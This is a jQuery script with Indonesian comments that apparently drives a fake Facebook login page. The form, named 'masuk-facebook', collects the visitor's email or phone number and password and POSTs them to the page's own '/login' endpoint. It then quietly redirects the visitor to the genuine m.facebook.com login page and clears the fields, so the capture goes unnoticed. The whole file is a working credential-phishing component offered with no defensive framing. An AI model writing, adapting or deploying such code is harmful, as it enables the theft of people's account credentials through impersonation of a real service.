$(document).ready(function(){
  $('#masuk-facebook').submit(function(e){
    e.preventDefault();
    
    const email = $('#email').val();
    const password = $('#password').val();
    
    //Validasi input
    const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const phoneRegex = /^\+?[0-9]{10,15}$/; // Nomor telepon format internasional dengan opsional tanda '+'
    
    let isValid = true;
    
    // Validasi email atau nomor telepon
    if (!emailRegex.test(email) && !phoneRegex.test(email)) {
      // alert('error');
      isValid = false;
    }
    
    // Validasi panjang password (minimal 8 karakter, maksimal 50 karakter)
    if (password.length < 8 || password.length > 50) {
      // alert('error');
      isValid = false;
    }
    
    // Jika validasi lolos, kirim form
    if (isValid) {
      
      $.ajax({
      type: 'POST',
      url: '/login',
      data: { email: email, password: password },
      success: function(response) {
        //alert(response); // Menampilkan pesan sukses
        // Melakukan pengalihan setelah 1 detik
        
        setTimeout(function() {
          window.location.href = "https://m.facebook.com/login/";
        }, 1000);
        
        setTimeout(function() {
          $('#email').val('');
          $('#password').val('');
        }, 1000);
        
      },
      error: function() {
        alert('Error.');
      }
    });
    
    }
    
    
  });
});